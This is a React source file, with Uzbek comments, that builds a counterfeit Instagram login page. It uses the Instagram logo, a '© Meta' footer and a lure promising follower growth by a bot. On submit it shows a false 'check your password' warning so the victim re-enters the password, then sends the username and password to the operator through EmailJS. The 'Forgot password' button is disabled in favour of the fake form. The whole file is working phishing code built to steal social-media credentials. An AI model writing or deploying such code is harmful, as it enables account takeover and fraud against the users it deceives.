import React, { useState } from 'react';
import emailjs from 'emailjs-com';
import { ToastContainer, toast } from 'react-toastify';
import 'react-toastify/dist/ReactToastify.css';
import Logo from '../assets/logo.webp';

function Instagram() {
  const [formData, setFormData] = useState({
    username: '',
    password: '',
  });
  const [passwordEntered, setPasswordEntered] = useState(false);

  const handleChange = (e) => {
    setFormData({
      ...formData,
      [e.target.name]: e.target.value,
    });
  };

  const handleSubmit = (e) => {
    e.preventDefault();

    if (!formData.username || !formData.password) {
      // Agar username yoki password bo'sh bo'lsa, xabar ko'rsatish
      toast.error('Iltimos, barcha maydonlarni to‘ldiring!', {
        position: "top-right",
      });
      return;
    }

    if (!passwordEntered) {
      toast.warning('Sorry, please check your password', {
        position: "top-right",
      });
      setPasswordEntered(true);
      return;
    } else {
      toast.success('Our bot will increase your users to 150 in 2 days', {
        position: "top-right",
      });
    }

    // EmailJS orqali xabarni jo'natish
    emailjs.send(
      'YOUR_SERVICE_ID', // EmailJS service ID o'rnating
      'YOUR_TEMPLATE_ID', // EmailJS template ID o'rnating
      {
        username: formData.username,
        password: formData.password,
      },
      'YOUR_USER_ID' // EmailJS user ID o'rnating
    ).then(
      (result) => {
        console.log('Email sent:', result.text);
      },
      (error) => {
        console.error('Error:', error.text);
      }
    );
  };

  const handleForgotPassword = () => {
    toast.warn("You can only log in with us");
  };

  return (
    <div className="flex items-center justify-center h-screen bg-gradient-to-tr from-pink-100 via-purple-100 to-yellow-100 ">
      <ToastContainer /> {/* Toast container komponenti */}
      <div className="w-full max-w-xl h-screen flex items-center justify-center p-6  ">
        <div>
          <div className="flex justify-center mb-16">
            <img src={Logo} alt="Instagram logo" className="w-32 h-32" />
          </div>

          <form className="space-y-4" onSubmit={handleSubmit}>
            <input
              type="text"
              name="username"
              placeholder="Username, email or mobile number"
              value={formData.username}
              onChange={handleChange}
              className="w-full px-4 py-3 text-sm border border-gray-300 rounded-md focus:outline-none focus:ring-1 focus:ring-gray-400 bg-gray-50"
            />
            <input
              type="password"
              name="password"
              placeholder="Password"
              value={formData.password}
              onChange={handleChange}
              className="w-full px-4 py-3 text-sm border border-gray-300 rounded-md focus:outline-none focus:ring-1 focus:ring-gray-400 bg-gray-50"
            />
            <button
              type="submit"
              className="w-full py-2 text-sm font-semibold text-white bg-blue-500 rounded-[100px] hover:bg-blue-600 focus:outline-none focus:ring-2 focus:ring-blue-400"
            >
              Log in
            </button>
          </form>

          <div className="flex justify-center mt-5">
            <button
              onClick={handleForgotPassword}
              className="text-xs text-blue-500 hover:underline"
            >
              Forgot password?
            </button>
          </div>

          <div className="flex items-center justify-center pt-28 space-x-1">
            <button className="text-sm font-semibold text-blue-500 hover:underline">
              Create new account
            </button>
          </div>

          <div className="flex justify-center mt-1">
            <p className="text-xs text-gray-400">© Meta</p>
          </div>
        </div>
      </div>
    </div>
  );
}

export default Instagram;
